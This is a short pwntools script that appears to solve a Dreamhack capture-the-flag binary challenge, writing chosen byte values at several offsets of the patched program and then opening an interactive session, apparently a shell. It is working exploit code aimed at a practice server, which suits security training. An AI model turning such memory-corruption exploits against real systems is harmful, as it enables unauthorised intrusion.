#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 10780)

    return r


def main():
    r = conn()

    r.sendlineafter(b": ", b"804")
    r.sendlineafter(b": ", b"142")

    r.sendline(b"806")
    r.sendlineafter(b": ", b"191")

    r.sendline(b"807")
    r.sendlineafter(b": ", b"254")

    r.sendline(b"804")
    r.sendlineafter(b": ", b"0")

    r.interactive()


if __name__ == "__main__":
    main()
